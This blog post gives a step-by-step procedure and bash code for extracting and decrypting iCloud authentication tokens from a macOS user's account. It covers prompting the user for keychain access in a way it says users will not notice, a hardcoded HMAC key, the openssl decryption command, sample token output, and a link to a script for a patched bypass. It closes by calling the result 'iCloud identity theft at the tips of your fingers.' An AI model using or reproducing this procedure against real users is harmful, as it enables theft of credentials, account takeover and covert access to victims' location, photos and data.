---
author: noncetonic
layout: post
title: iCloud Authentication Token acquisition on macOS
---

## Foreward ##
While this is by no means new or groundbreaking information I've been meaning to document a process known to the forensic and law enforcement community and provided as part of point-and-click toolkits available to the general public from companies such as [Elcomsoft](https://www.elcomsoft.com/CATALOG/elcomsoft_2018_en.pdf). 

The aim of this post is to educate readers on the process by which Apple protects iCloud tokens and provide a procedure for manual acquisition of these tokens on modern versions of macOS.

>>> Another motivator for posting this article is to make up for the fact that back in mid 2017 I had started writing an article on dumping this tokens without interacting with the Keychain or requiring the user's password. The bug that allowed this has since been patched but is effective on early versions of 10.13 and prior.

>>> I've provided a ready-to-go script addressing this specific vulnerability which can found on [Github Gists](https://gist.github.com/n0ncetonic/d7fba855be0f5ca3ac9303764aa55438).

## Extraction on macOS
Extraction of iCloud Auth Tokens on macOS is a multi-step process and requires the iCloud Key stored in the targetted user's keychain. 

1.) Obtain the user's iCloud Key
2.) Generating the decryption key
3.) Decrypting the mmeTokenKey file

Let's get to it.

_Note:_ *If you're looking for a quick and easy automated tool to accomplishes this same procedure, I've linked to the (at time of writing) most updated and feature rich fork of `MMeTokenDecrypt` by `security-geeks` as `manwhoami` appears to have deleted their github account and consequentially the original codebase.*

## Obtaining iCloud Key from keychain
As the iCloud Key is stored encrypted within a user's keychain, extraction requires knowing the keychain password (almost always the same as a user's login password), or alternatively, utilizing the SecurityFramework to prompt the user for access to the keychain via the `security` command.

We will opt for the latter in this article to illustrate a technique which can be applied a large array of use cases.

### Obtaining iCloud Key using SecurityFramework
The following command will prompt the user to enter their password and returns the base64 encoded iCloud Key via STDOUT. Replace `UID` with the uid of the intended user.

>**Note:** Getting the uid a user is easiest via the `id -u [user]` command. If no user is specified, the current user's uid is returned.

`launchctl asuser UID security find-generic-password -ws 'iCloud'`

> **Note** The user will be prompted for their password **twice**. This is the standard behavior of macOS and most users will not notice the different permissions being requested. The first prompt grants **permission to access the key** named `iCloud` within a user's keychain while the second prompt grants **permission to read the value** of the `iCloud` key which has authorized access in the first prompt.

![iCloudKey_keychainPrompt](https://user-images.githubusercontent.com/29786827/44942972-55abce80-ad72-11e8-97c4-609116e7d14e.png)
![iCloudKey_keyPrompt](https://user-images.githubusercontent.com/29786827/44943059-1f6f4e80-ad74-11e8-80db-465c8439d566.png)

With the iCloud Key successfully obtained it is possible to generate the key used to decrypt the mmeTokenFile containing `mmeAuthToken` and other iCloud tokens.

## Generating the decryption key
iCloud Auth Tokens are encrypted using an HMAC-MD5 composed of an undocumented 44 character string used as the HMAC key and the base64 decoded iCloud Key as the HMAC message. The psuedo-code for generating the decryption key and a working implementation in BASH leveraging only tools available on a default macOS installation follow. Yay for living off the land.



> **Note** For the curious, `/System/Library/PrivateFrameworks/AOSKit.framework/Versions/A/AOSKit` contains the subroutine `#KeychainAccountStorage _generateKeyFromData:` which uses the HMAC Key provided above when generating the decryption key.
> HMAC Key: `t9s"lx^awe.580Gj%'ld+0LG<#9xa?>vb)-fkwb92[}`

```
psuedo.code
// This psuedocode demonstrates the process of generating the iCloud Auth Token decryption key
hex(hmac.new(key, message, digest(md5)))
```

### BASH
```
#!/bin/bash -e
# gen_hmac-md5.sh
#
# Given a value for message, generates an HMAC-MD5 for mmeToken decryption
# HMAC key is hardcoded. Outputs the result in base64 and hex encoding
#
# n0ncetonic Copyright 2019 Blacksun Research Labs 
gen_hmac-md5() {
  message="$1"
  key="t9s\"lx^awe.580Gj%'ld+0LG<#9xa?>vb)-fkwb92[}"
  
  hmac_md5=""

  hmac_md5=$(echo -n "$message" |base64 --decode| openssl dgst -md5 -hex -hmac "$key")
  
  echo "base64: $(base64 <<< ${hmac_md5})"
  echo "   hex: $(echo -n ${hmac_md5}"
}

gen_hmac-md5 $1
```

> **Note** The hex encoded decryption key is generally preferred for interoperability with other tools.

## Decrypting mmeAuthKey
Now that a valid decryption key has been generated the iCloud Auth Tokens can be obtained from the encrypted binary plist file stored in the `/Users/<USERNAME>/Library/Application Support/iCloud/Accounts/` directory. Files in this directory will either be symlinks with alphanumeric file names or standard files with filenames comprised of 9 digits. In the case of symlinks the email address tied to an iCloud DSID is disclosed as the filename, while the standard files disclose the `DSID` as the filename.

> **Note** The `DSID` is used in place of a username when authenticating using iCloud tokens. Making note of the `DSID` is recommended in case it is needed later.

Decrypting this file is done with the `openssl` command and results in xml structured Property List output containing the iCloud Auth Tokens. Ensure you replace `DSID` in this command with the user's actual `DSID`.

`openssl enc -d -aes-128-cbc -iv 0000000000000000 -K Hex_Encoded_Decryption_Key < "/Users/USERNAME/Library/Application Support/iCloud/Accounts/DSID" | plutil -extract 'tokens' xml1 -o - - `

>>> **Note** For output which lends itself better to scripting, copy-pasting, and readability, the decrypt command above can be changed to the command below.

`openssl enc -d -aes-128-cbc -iv 0000000000000000 -K a8f930a309a9188ca03877444ccaac6c < "/Users/user/Library/Application Support/iCloud/Accounts/8305714318 | plutil -extract 'tokens' xml1 -o - - |plutil -p -`

Resulting in output similar to below

```
{
	"cloudKitToken" => "iOIQ4Yq3J9l2AICrGYJt5pwl+k/sQJ2+FolAJNZ9ci++clFWhc1wx4/OrxK8u2Bexob0ZUC8K83guTCpNZonFpl9qSFRfaXyQ/2ga1hlfMMtYoj5MSElq2O4L9D02JCBmbmnXns3AIJusWW8AdxLNoVPZUaZdxd1CngEW3AS/2YltFHvhbhIyUkknMtHLUj5uoNJw6vfFumI10~~"
	"mapsToken" => "KW5Izw7FnUm/tbA81aTi4OLaZOzI0EQPmrajqC3W8ayFyyFTlWMCiEBWd8SnxeXJfx2HtOm2yNdmR01UFRAub2SnzPwmz7i4fiWI4h5VFd1ewVZR33QGBJBTXJqilvcC5Lz9huS1Kqqv8DxZeyWTm4hAVzQ0sqyuQG/yFLwjZydOIBICEAXUqdGSEnCdcyvFjlSd0ZDmZTFc10~~"
	"mmeAuthToken" => "Cw7Dzec+TpidWj26lmHGnCnIOQJeK3GR63+XCNT9E8CNrdJkooOgw6wtwRhJwcWRgynVnuFUGr2dYfycgnFxj5FGVAjh/8Y8yhUSn6VlDZcC7Kj+UTfnKsX5aW5GUki2iOttBNalYtiZLuVSub1MnghMpHY+Xtl6fEXSFi5A8culgXPsVbQdF4SGCPTzP9PQj+1qgk4iezr710=="
	"mmeBTMMInfiniteToken" => "SDgbvkIEolIutlD4rwlnuAkzmaZbOCc7f4hVYXWRzCqOsvQSQ6D5Vorc+p7UE7t08+tK7T3FVzSTiofE5oidM0jJCW7NaFPgKEFOVjK4aK/2ctcEQ/y1nv0eQcee/XJeI/mK/YBgmTsbIZ74+OUL9mr4t/IrQJffEBTR0FPFhoMhxwcP/kMCtEfD8egN4SUTkT6K8flQGqnT10~~"
	"mmeFMFAppToken" => "k+qpMM9hOUnUoIeamVsq+RYyBWxL0OSKFECvsGBu+I3loe3Wvl6dl8UeLeMQc6NJgrGjrYvwd1RsdpDiRFYNNm2mAI15GMTII6HJlzk9N6Ufla6rFDAQ8Yj861SPH7d1JcMiTXMZ/vKNpJqSOp26FRAwudozBTICYfb3RkLOicKydXaY5PTX6iCRPi17OqKsMbY3FhbZJTYJ10~~"
	"mmeFMIPToken" => "Ha0+FmWTnkjckMixOlKhvwNohQ1H9+QkVBovAVyVpGXGWiypbcIMByozSTtSWzb2CFEfWY3X4JkWAE35PLrG8yFEX1qYAMLTeoxeumVblCK30tBCgXv2RmB+CbrTSCKWyF7IR48eJ69c0gWWvMnhsDXLNvEUFiW0t6g6ktcQW8n/mS+ObqRw2SCYqS+1ZjMJKkmTJvd7iPF310~~"
}
```

## Closing

There you go; you've got a handful of tokens ready to be used with iCloud APIs like "FindMyFriends", "FindMyiPhone", "iPhotos" and more.

iCloud identity theft at the tips of your fingers means flattery has never been easier.

> "Imitation is the sincerest form of flattery"
*Charles Caleb Colton*


---

[security-geeks/MMeTokenDecrypt](https://github.com/security-geeks/MMeTokenDecrypt)